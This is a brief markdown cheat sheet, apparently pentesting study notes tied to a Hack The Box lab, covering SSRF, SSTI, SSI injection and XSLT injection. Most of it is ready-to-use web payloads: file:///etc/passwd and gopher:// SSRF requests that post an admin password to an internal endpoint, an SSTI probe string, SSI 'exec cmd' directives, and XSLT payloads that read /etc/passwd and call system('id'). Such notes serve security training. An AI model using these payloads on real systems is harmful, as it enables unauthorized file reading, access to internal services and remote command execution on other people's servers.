## SSRF
**Exploitation
- Internal portscan by accessing ports on localhost
- Accessing restricted endpoints
**Protocols
```
http://127.0.0.1/
file:///etc/passwd
gopher://dateserver.htb:80/_POST%20/admin.php%20HTTP%2F1.1%0D%0AHost:%20dateserver.htb%0D%0AContent-Length:%2013%0D%0AContent-Type:%20application/x-www-form-urlencoded%0D%0A%0D%0Aadminpw%3Dadmin
```

## SSTI
**Exploitation
- Templating Engines are used to dynamically generate content
**Test String
```
${{<%[%'"}}%\.
```

## SSI Injection - Directives
```
<!--#printenv -->
<!--#config errmsg="Error!" -->
<!--#echo var="DOCUMENT_NAME" var="DATE_LOCAL" -->
<!--#exec cmd="whoami" -->
<!--#include virtual="index.html" -->
```

## XSLT Injection
```
<xsl:template>
<xsl:value-of>
<xsl:for-each>
<xsl:sort>
<xsl:if>

<xsl:value-of select="system-property('xsl:version')" />
<xsl:value-of select="system-property('xsl:vendor')" />
<xsl:value-of select="system-property('xsl:vendor-url')" />
<xsl:value-of select="system-property('xsl:product-name')" />
<xsl:value-of select="system-property('xsl:product-version')" />
LFI	
<xsl:value-of select="unparsed-text('/etc/passwd', 'utf-8')" />
<xsl:value-of select="php:function('file_get_contents','/etc/passwd')" />
RCE	
<xsl:value-of select="php:function('system','id')" />
```
